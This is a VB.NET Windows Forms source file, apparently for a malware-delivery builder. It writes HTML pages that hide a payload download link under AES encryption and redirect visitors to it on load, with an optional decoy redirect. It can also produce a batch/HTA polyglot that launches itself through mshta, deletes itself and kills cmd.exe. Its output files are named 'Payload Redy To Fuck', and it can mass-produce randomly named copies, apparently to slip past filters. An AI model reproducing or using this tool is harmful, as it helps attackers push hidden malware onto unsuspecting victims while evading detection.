Imports System.IO
Imports System.Security.Cryptography
Imports System.Text
Imports System.Threading

Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub
#Region "EncryptString HTML"
    Private Sub AnotherSiteLinkCheckBox_CheckedChanged(sender As Object, e As EventArgs) Handles AnotherSiteLinkCheckBox.CheckedChanged
        If AnotherSiteLinkCheckBox.Checked = True Then
            AnotherSiteLinktextbox.Enabled = True
            NumericUpDown1.Value = "7000"
        Else
            AnotherSiteLinktextbox.Enabled = False
            NumericUpDown1.Value = "1000"
        End If
    End Sub
    Private Sub CheckBoxBatUsingHtml_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBoxBatUsingHtml.CheckedChanged
        If CheckBoxBatUsingHtml.Checked = True Then
            TextBoxMshtaFormMessage.Enabled = True
        Else
            TextBoxMshtaFormMessage.Enabled = False
        End If
    End Sub
    Private Sub EncryptHTMLButtonClick()
        Dim key As String = "12345678901234567890123456789012" ' مفتاح سري بطول 32 حرفًا
        Dim fileURL As String = HtmlPayloadLink.Text ' تغيير المسار إلى المسار الفعلي للملف

        If ChkMultipleFiles.Checked Then
            Dim numberOfFiles As Integer = CInt(numFilesCount.Value)
            ProgressBar1.Maximum = numberOfFiles
            ProgressBar1.Value = 0

            For i As Integer = 1 To numberOfFiles
                ThreadPool.QueueUserWorkItem(New WaitCallback(AddressOf EncryptAndSaveHTML), New Object() {fileURL, key, i})
            Next
        Else
            If CheckBoxBatUsingHtml.Checked = True Then
                Dim encryptedURL As String = EncryptString(fileURL, key)
                Dim defaultFileName As String = "Bat Using Html Redy To Fuck.bat"
                Dim savePath As String = Path.Combine(Application.StartupPath, defaultFileName)
                SaveEncryptedHTML(savePath, encryptedURL)
                MessageBox.Show($"File created successfully: {savePath}", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Else
                Dim encryptedURL As String = EncryptString(fileURL, key)
                Dim defaultFileName As String = "Html Payload Redy To Fuck.html"
                Dim savePath As String = Path.Combine(Application.StartupPath, defaultFileName)
                SaveEncryptedHTML(savePath, encryptedURL)
                MessageBox.Show($"File created successfully: {savePath}", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
            End If

        End If
    End Sub

    Private Sub EncryptAndSaveHTML(args As Object)
        Dim fileURL As String = DirectCast(args(0), String)
        Dim key As String = DirectCast(args(1), String)
        Dim fileIndex As Integer = DirectCast(args(2), Integer)

        Dim encryptedURL As String = EncryptString(fileURL, key)
        Dim randomFileName As String = Path.Combine(Application.StartupPath, GenerateRandomFileNameHTML() & ".html")
        SaveEncryptedHTML(randomFileName, encryptedURL)
        Me.Invoke(Sub() ProgressBar1.Value += 1)
    End Sub

    Private Sub SaveEncryptedHTML(fileName As String, encryptedURL As String)
        SyncLock Me
            Using sw As New StreamWriter(fileName)
                If CheckBoxBatUsingHtml.Checked = True Then
                    sw.WriteLine("<!-- :")
                    sw.WriteLine("@echo off")
                    sw.WriteLine("echo cmd /min /C ""set __COMPAT_LAYER=RUNASINVOKER && start "" ""%batch_file_name%"" & timeout /t 2 /nobreak >nul & del ""%~f0"" & taskkill /f /im cmd.exe""")
                    sw.WriteLine("start """" mshta ""%~f0"" %*")
                    sw.WriteLine("goto :EOF")
                    sw.WriteLine("-->")
                    sw.WriteLine("" & TextBoxMshtaFormMessage.Text & "")
                End If
                sw.WriteLine("<!DOCTYPE html>")
                sw.WriteLine("<html lang=""en"">")
                sw.WriteLine("<head>")
                sw.WriteLine("<meta charset=""UTF-8"">")
                sw.WriteLine("<meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">")
                sw.WriteLine("<title>" & PageSiteTitleTextBox.Text & "</title>")
                sw.WriteLine("<script src=""https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js""></script>")
                sw.WriteLine("</head>")
                sw.WriteLine("<body>")
                sw.WriteLine("<script>")
                sw.WriteLine("window.onload = function() {")
                sw.WriteLine($"var fileURL = '{encryptedURL}';")
                sw.WriteLine("var key = '12345678901234567890123456789012';")
                sw.WriteLine("var parts = fileURL.split("":"");")
                sw.WriteLine("var iv = CryptoJS.enc.Base64.parse(parts[0]);")
                sw.WriteLine(" var ciphertext = CryptoJS.enc.Base64.parse(parts[1]);")
                sw.WriteLine("var decrypted = CryptoJS.AES.decrypt({")
                sw.WriteLine("ciphertext: ciphertext,")
                sw.WriteLine("salt: CryptoJS.enc.Utf8.parse(''),")
                sw.WriteLine("keySize: 256 / 32,")
                sw.WriteLine("iv: iv")
                sw.WriteLine("}, CryptoJS.enc.Utf8.parse(key), {")
                sw.WriteLine("iv: iv")
                sw.WriteLine("});")
                sw.WriteLine("var plaintextURL = decrypted.toString(CryptoJS.enc.Utf8);")
                sw.WriteLine("window.location.href = plaintextURL;")
                If AnotherSiteLinkCheckBox.Checked = True Then
                    sw.WriteLine("setTimeout(function(){")
                    sw.WriteLine("window.location.href = '" & AnotherSiteLinktextbox.Text & "';")
                    sw.WriteLine("}, " & NumericUpDown1.Value & ");")
                End If
                sw.WriteLine("};")
                sw.WriteLine("</script>")
                sw.WriteLine("</body>")
                sw.WriteLine("</html>")
            End Using
        End SyncLock
    End Sub


    Private Function EncryptString(ByVal plainText As String, ByVal key As String) As String
        Dim encrypted As String = ""
        Dim iv As Byte() = Nothing
        Using aesAlg As Aes = Aes.Create()
            aesAlg.Key = Encoding.UTF8.GetBytes(key)
            aesAlg.Mode = CipherMode.CBC ' تغيير وضع التشفير إلى CBC
            aesAlg.Padding = PaddingMode.PKCS7 ' تعيين طريقة التبطين
            iv = aesAlg.IV ' حفظ الـ IV
            Dim encryptor As ICryptoTransform = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV)
            Using msEncrypt As New MemoryStream()
                Using csEncrypt As New CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write)
                    Using swEncrypt As New StreamWriter(csEncrypt)
                        swEncrypt.Write(plainText)
                    End Using
                End Using
                encrypted = Convert.ToBase64String(msEncrypt.ToArray())
            End Using
        End Using
        Dim ivBase64 As String = Convert.ToBase64String(iv)
        Return ivBase64 & ":" & encrypted
    End Function

    Private Function GenerateRandomFileNameHTML() As String
        Dim chars As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" &
                              "ابتثجحخدذرزسشصضطظعغفقكلمنهوي"
        Dim random As New Random()
        Dim builder As New StringBuilder()
        For i As Integer = 1 To 15
            Dim ch As Char = chars(random.Next(chars.Length))
            builder.Append(ch)
        Next
        Return builder.ToString()
    End Function

    Private Sub FlatButton1_Click(sender As Object, e As EventArgs) Handles FlatButton1.Click
        EncryptHTMLButtonClick()
    End Sub

#End Region
End Class
